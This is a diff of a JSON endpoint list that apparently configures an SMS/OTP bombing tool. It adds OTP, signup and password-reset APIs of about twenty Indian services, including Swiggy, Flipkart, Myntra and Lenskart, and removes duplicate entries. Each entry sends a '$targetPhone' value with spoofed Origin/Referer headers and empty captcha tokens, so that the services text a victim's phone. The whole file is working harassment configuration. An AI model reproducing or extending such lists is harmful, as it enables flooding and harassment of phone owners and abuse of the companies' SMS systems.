@@ -2,7 +2,49 @@
   "version": 1,
   "endpoints": [
     {
-      "id": "dominos_sms_1",
+      "id": "swiggy_signup",
+      "type": "SMS",
+      "url": "https://www.swiggy.com/dapi/auth/signup",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 13)",
+        "Origin": "https://www.swiggy.com",
+        "Referer": "https://www.swiggy.com/auth/register"
+      },
+      "body": "{\"mobile\":\"$targetPhone\",\"name\":\"Test User\",\"email\":\"test$targetPhone@example.com\",\"referral\":\"\",\"otp\":\"\"}",
+      "enabled": true
+    },
+    {
+      "id": "blinkit_1",
+      "type": "SMS",
+      "url": "https://blinkit.com/v2/accounts/",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 13)",
+        "Origin": "https://blinkit.com",
+        "Referer": "https://blinkit.com/"
+      },
+      "body": "user_phone=$targetPhone",
+      "enabled": true
+    },
+    {
+      "id": "bigbasket_otp",
+      "type": "SMS",
+      "url": "https://www.bigbasket.com/member-tdl/v3/member/otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://www.bigbasket.com",
+        "Referer": "https://www.bigbasket.com/auth/login/"
+      },
+      "body": "{\"identifier\":\"$targetPhone\",\"referrer\":\"unified_login\",\"recaptchaToken\":\"\"}",
+      "enabled": true
+    },
+    {
+      "id": "dominos_sms",
       "type": "SMS",
       "url": "https://api.dominos.co.in/loginhandler/forgotpassword",
       "method": "POST",
@@ -17,59 +59,7 @@
       "enabled": true
     },
     {
-      "id": "dominos_sms_2",
-      "type": "SMS",
-      "url": "https://api.dominos.co.in/loginhandler/forgotpassword",
-      "method": "POST",
-      "headers": {
-        "Content-Type": "application/json",
-        "Origin": "https://m.dominos.co.in",
-        "Referer": "https://m.dominos.co.in/"
-      },
-      "body": "{\"lastName\":\"\",\"mobile\":\"$targetPhone\",\"firstName\":\"\"}",
-      "enabled": true
-    },
-    {
-      "id": "dominos_sms_3",
-      "type": "SMS",
-      "url": "https://api.dominos.co.in/loginhandler/forgotpassword",
-      "method": "POST",
-      "headers": {
-        "Content-Type": "application/json",
-        "Origin": "https://m.dominos.co.in",
-        "Referer": "https://m.dominos.co.in/"
-      },
-      "body": "{\"lastName\":\"\",\"mobile\":\"$targetPhone\",\"firstName\":\"\"}",
-      "enabled": true
-    },
-    {
-      "id": "dominos_sms_4",
-      "type": "SMS",
-      "url": "https://api.dominos.co.in/loginhandler/forgotpassword",
-      "method": "POST",
-      "headers": {
-        "Content-Type": "application/json",
-        "Origin": "https://m.dominos.co.in",
-        "Referer": "https://m.dominos.co.in/"
-      },
-      "body": "{\"lastName\":\"\",\"mobile\":\"$targetPhone\",\"firstName\":\"\"}",
-      "enabled": true
-    },
-    {
-      "id": "dominos_sms_5",
-      "type": "SMS",
-      "url": "https://api.dominos.co.in/loginhandler/forgotpassword",
-      "method": "POST",
-      "headers": {
-        "Content-Type": "application/json",
-        "Origin": "https://m.dominos.co.in",
-        "Referer": "https://m.dominos.co.in/"
-      },
-      "body": "{\"lastName\":\"\",\"mobile\":\"$targetPhone\",\"firstName\":\"\"}",
-      "enabled": true
-    },
-    {
-      "id": "cuemath_sms_1",
+      "id": "cuemath_sms",
       "type": "SMS",
       "url": "https://www.cuemath.com/api/v4/parents/",
       "method": "POST",
@@ -82,55 +72,213 @@
       "enabled": true
     },
     {
-      "id": "cuemath_sms_2",
+      "id": "licious_sms",
       "type": "SMS",
-      "url": "https://www.cuemath.com/api/v4/parents/",
+      "url": "https://www.licious.in/api/login/signup",
       "method": "POST",
       "headers": {
         "Content-Type": "application/json",
-        "Origin": "https://www.cuemath.com",
-        "Referer": "https://www.cuemath.com/"
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://www.licious.in",
+        "Referer": "https://www.licious.in/"
       },
-      "body": "{\"intl_mobile\":{\"phone\":\"\"},\"phone\":\"$targetPhone\",\"email\":\"test2@example.com\",\"full_name\":\"Test User 2\",\"timezone\":\"Asia/Calcutta\"}",
+      "body": "{\"phone\":\"$targetPhone\",\"captcha_token\":\"\"}",
       "enabled": true
     },
     {
-      "id": "cuemath_sms_3",
+      "id": "freshtohome_sms",
       "type": "SMS",
-      "url": "https://www.cuemath.com/api/v4/parents/",
+      "url": "https://www.freshtohome.com/ajaxlogin/ajax/index/",
       "method": "POST",
       "headers": {
-        "Content-Type": "application/json",
-        "Origin": "https://www.cuemath.com",
-        "Referer": "https://www.cuemath.com/"
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://www.freshtohome.com",
+        "Referer": "https://www.freshtohome.com/"
       },
-      "body": "{\"intl_mobile\":{\"phone\":\"\"},\"phone\":\"$targetPhone\",\"email\":\"test3@example.com\",\"full_name\":\"Test User 3\",\"timezone\":\"Asia/Calcutta\"}",
+      "body": "ajax=otplogin&phone=$targetPhone&otp=",
       "enabled": true
     },
     {
-      "id": "cuemath_sms_4",
+      "id": "apna_co_sms",
       "type": "SMS",
-      "url": "https://www.cuemath.com/api/v4/parents/",
+      "url": "https://api.production.infra.apna.co/apna-auth-core/api/userprofile/v1/otp/",
       "method": "POST",
       "headers": {
         "Content-Type": "application/json",
-        "Origin": "https://www.cuemath.com",
-        "Referer": "https://www.cuemath.com/"
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://apna.co",
+        "Referer": "https://apna.co/"
       },
-      "body": "{\"intl_mobile\":{\"phone\":\"\"},\"phone\":\"$targetPhone\",\"email\":\"test4@example.com\",\"full_name\":\"Test User 4\",\"timezone\":\"Asia/Calcutta\"}",
+      "body": "{\"phone_number\":\"91$targetPhone\",\"retries\":0,\"hash_type\":\"employer\",\"source\":\"employer\"}",
       "enabled": true
     },
     {
-      "id": "cuemath_sms_5",
+      "id": "foundit_sms",
       "type": "SMS",
-      "url": "https://www.cuemath.com/api/v4/parents/",
+      "url": "https://www.foundit.in/seeker-profile/api/anonymousSendOtp",
       "method": "POST",
       "headers": {
         "Content-Type": "application/json",
-        "Origin": "https://www.cuemath.com",
-        "Referer": "https://www.cuemath.com/"
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://www.foundit.in",
+        "Referer": "https://www.foundit.in/"
       },
-      "body": "{\"intl_mobile\":{\"phone\":\"\"},\"phone\":\"$targetPhone\",\"email\":\"test5@example.com\",\"full_name\":\"Test User 5\",\"timezone\":\"Asia/Calcutta\"}",
+      "body": "{\"countryCode\":\"91\",\"mobileNumber\":\"$targetPhone\",\"email\":\"test@example.com\",\"reCaptchaAction\":\"claimNumber\",\"reCaptchaToken\":\"\"}",
+      "enabled": true
+    },
+    {
+      "id": "unacademy_sms",
+      "type": "SMS",
+      "url": "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://unacademy.com",
+        "Referer": "https://unacademy.com/login"
+      },
+      "body": "{\"phone\":\"$targetPhone\",\"country_code\":\"IN\",\"otp_type\":1,\"email\":\"\",\"send_otp\":true,\"is_un_teach_user\":false}",
+      "enabled": true
+    },
+    {
+      "id": "vedantu_sms",
+      "type": "SMS",
+      "url": "https://user.vedantu.com/user/preLoginVerification",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://www.vedantu.com",
+        "Referer": "https://www.vedantu.com/"
+      },
+      "body": "{\"email\":null,\"phoneCode\":\"+91\",\"phoneNumber\":\"$targetPhone\",\"version\":2,\"ver\":1.033,\"event\":\"NEW_FLOW\"}",
+      "enabled": true
+    },
+    {
+      "id": "flipkart_sms",
+      "type": "SMS",
+      "url": "https://1.rome.api.flipkart.com/1/action/view",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
+        "Origin": "https://www.flipkart.com",
+        "Referer": "https://www.flipkart.com/login"
+      },
+      "body": "{\"actionRequestContext\":{\"type\":\"LOGIN_IDENTITY_VERIFY\",\"loginIdPrefix\":\"+91\",\"loginId\":\"$targetPhone\",\"loginType\":\"MOBILE\",\"screenName\":\"LOGIN_V4_MOBILE\",\"sourceContext\":\"DEFAULT\",\"verificationType\":\"OTP\"},\"clientQueryParamMap\":{\"ret\":\"/\"}}",
+      "enabled": true
+    },
+    {
+      "id": "meesho_sms",
+      "type": "SMS",
+      "url": "https://www.meesho.com/api/v1/user/login/request-otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://www.meesho.com",
+        "Referer": "https://www.meesho.com/"
+      },
+      "body": "{\"phone_number\":\"$targetPhone\"}",
+      "enabled": true
+    },
+    {
+      "id": "myntra_sms",
+      "type": "SMS",
+      "url": "https://www.myntra.com/gateway/v1/auth/getotp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://www.myntra.com",
+        "Referer": "https://www.myntra.com/"
+      },
+      "body": "{\"phoneNumber\":\"$targetPhone\",\"signup\":\"ONECLICK\"}",
+      "enabled": true
+    },
+    {
+      "id": "ajio_sms",
+      "type": "SMS",
+      "url": "https://www.ajio.com/ext/headless/api/external/v1/webauth/generateloginotp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://www.ajio.com",
+        "Referer": "https://www.ajio.com/"
+      },
+      "body": "{\"phoneNumber\":\"$targetPhone\",\"signup\":\"ONECLICK\"}",
+      "enabled": true
+    },
+    {
+      "id": "relianceretail_sms",
+      "type": "SMS",
+      "url": "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://www.relianceretail.com",
+        "Referer": "https://www.relianceretail.com/"
+      },
+      "body": "{\"mobile\":\"$targetPhone\"}",
+      "enabled": true
+    },
+    {
+      "id": "nykaafashion_sms",
+      "type": "SMS",
+      "url": "https://www.nykaafashion.com/grahak-service/api/v1/auth/login/init?loginMethod=MOBILE_OTP",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://www.nykaafashion.com",
+        "Referer": "https://www.nykaafashion.com/"
+      },
+      "body": "{\"mobileOrEmail\":\"$targetPhone\"}",
+      "enabled": true
+    },
+    {
+      "id": "pepperfry_sms",
+      "type": "SMS",
+      "url": "https://www.pepperfry.com/api/account/auth/sentOtp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://www.pepperfry.com",
+        "Referer": "https://www.pepperfry.com/"
+      },
+      "body": "{\"mobile\":\"$targetPhone\",\"mobile_country\":\"+91\",\"token\":\"\"}",
+      "enabled": true
+    },
+    {
+      "id": "lenskart_sms",
+      "type": "SMS",
+      "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://www.lenskart.com",
+        "Referer": "https://www.lenskart.com/"
+      },
+      "body": "{\"captcha\":null,\"phoneCode\":\"+91\",\"telephone\":\"$targetPhone\"}",
+      "enabled": true
+    },
+    {
+      "id": "croma_sms",
+      "type": "SMS",
+      "url": "https://api.tatadigital.com/api/v2/sso/check-phone-croma",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://www.croma.com",
+        "Referer": "https://www.croma.com/"
+      },
+      "body": "{\"countryCode\":\"91\",\"phone\":\"$targetPhone\"}",
       "enabled": true
     }
   ]
